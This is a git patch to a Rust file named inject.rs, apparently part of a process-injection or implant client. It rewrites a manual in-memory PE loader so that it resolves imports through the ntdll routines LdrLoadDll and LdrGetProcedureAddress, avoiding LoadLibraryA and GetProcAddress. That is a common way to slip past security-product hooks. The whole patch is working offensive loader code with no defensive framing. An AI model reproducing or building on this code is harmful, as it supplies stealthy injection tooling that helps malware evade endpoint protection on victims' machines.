@@ -1,0 +1,103 @@
+From 35166166dd39eb646883e514a46909e92f502f97 Mon Sep 17 00:00:00 2001
+From: Ron Panduwana <panduwana@gmail.com>
+Date: Mon, 19 Oct 2026 13:13:31 +0700
+Subject: [PATCH 12/14] using User-mode loader (LoadLibraryA to LdrLoadDll,
+ GetProcAddress to LdrGetProcedureAddress)
+
+---
+ client/src/inject.rs | 52 +++++++++++++++++++++++++++++++-------------
+ 1 file changed, 37 insertions(+), 15 deletions(-)
+
+diff --git a/client/src/inject.rs b/client/src/inject.rs
+index 1e39406..3165a0a 100644
+--- a/client/src/inject.rs
++++ b/client/src/inject.rs
+@@ -14,12 +14,15 @@ use ntapi::ntobapi::NtClose;
+ #[cfg(windows)]
+ use ntapi::winapi::shared::ntdef::{HANDLE, NTSTATUS, NT_SUCCESS, NULL};
+ #[cfg(windows)]
++use ntapi::ntldr::{LdrLoadDll, LdrGetProcedureAddress};
++#[cfg(windows)]
++use ntapi::winapi::shared::ntdef::{UNICODE_STRING, ANSI_STRING};
++#[cfg(windows)]
+ use windows::{
+     core::PCSTR,
+     Win32::{Foundation::{FARPROC, HINSTANCE}, 
+     System::{
+         Diagnostics::Debug::*, 
+-        LibraryLoader::{GetProcAddress, LoadLibraryA}, 
+         Memory::*, 
+         SystemServices::*, 
+         Threading::*, 
+@@ -292,12 +295,25 @@ impl PE {
+                     break;
+                 }
+ 
+-                let dll_name = address.offset((*img_import_descriptor).Name as isize) as *const i8;
+-                let h_module = LoadLibraryA(PCSTR(dll_name as _)).expect("[!] Error loading library");
++                let dll_name_ptr = address.offset((*img_import_descriptor).Name as isize) as *const i8;
++                let dll_name_str = std::ffi::CStr::from_ptr(dll_name_ptr).to_string_lossy();
++                let dll_name_utf16: Vec<u16> = dll_name_str.encode_utf16().chain(std::iter::once(0)).collect();
++
++                let mut unicode_dll_name = UNICODE_STRING {
++                    Length: ((dll_name_utf16.len() - 1) * 2) as u16,
++                    MaximumLength: (dll_name_utf16.len() * 2) as u16,
++                    Buffer: dll_name_utf16.as_ptr() as *mut u16,
++                };
++
++                let mut h_module: *mut c_void = std::ptr::null_mut();
++                let status = LdrLoadDll(std::ptr::null_mut(), std::ptr::null_mut(), &mut unicode_dll_name, &mut h_module);
++                if !NT_SUCCESS(status) {
++                    return Err(format!("[!] Error loading library {}: {}", dll_name_str, status));
++                }
+ 
+                 let mut thunk_size = 0;
++                let mut func_address: *mut c_void = std::ptr::null_mut();
+ 
+-                let mut func_address: FARPROC;
+                 loop {
+                     let original_first_chunk = address.offset(original_first_chunk_rva as isize + thunk_size) as *mut IMAGE_THUNK_DATA64;
+                     let first_thunk = address.offset(first_thunk_rva as isize + thunk_size) as *mut IMAGE_THUNK_DATA64;
+@@ -308,22 +324,28 @@ impl PE {
+ 
+                     if image_snap_by_ordinal((*original_first_chunk).u1.Ordinal) {
+                         let ordinal = image_ordinal((*original_first_chunk).u1.Ordinal);
+-                        func_address = GetProcAddress(h_module, PCSTR(ordinal as _));
++                        let status = LdrGetProcedureAddress(h_module, std::ptr::null_mut(), ordinal as u32, &mut func_address);
++                        if !NT_SUCCESS(status) {
++                             return Err(format!("[!] Error finding ordinal function: {}", status));
++                        }
+                     } else {
+                         let image_import_name = address.offset((*original_first_chunk).u1.AddressOfData as isize) as *mut IMAGE_IMPORT_BY_NAME;
+-                        let name = &(*image_import_name).Name as *const i8;
+-                        func_address = GetProcAddress(h_module, PCSTR(name as _));
+-                    }
+-
+-                    match func_address {
+-                        Some(f) => {
+-                            (*first_thunk).u1.Function = f as *const () as u64;
+-                        },
+-                        None => {
+-                            return Err("[!] The expected function was not found".to_string());
++                        let name_ptr = &(*image_import_name).Name as *const i8;
++                        let name_str = std::ffi::CStr::from_ptr(name_ptr);
++                        
++                        let mut ansi_name = ANSI_STRING {
++                            Length: name_str.to_bytes().len() as u16,
++                            MaximumLength: (name_str.to_bytes().len() + 1) as u16,
++                            Buffer: name_ptr as *mut i8,
++                        };
++
++                        let status = LdrGetProcedureAddress(h_module, &mut ansi_name, 0, &mut func_address);
++                        if !NT_SUCCESS(status) {
++                             return Err(format!("[!] Error finding function {}: {}", name_str.to_string_lossy(), status));
+                         }
+                     }
+ 
++                    (*first_thunk).u1.Function = func_address as u64;
+                     thunk_size += size_of::<IMAGE_THUNK_DATA64>() as isize;
+                 }
+             }
+-- 
+2.39.5 (Apple Git-154)
+
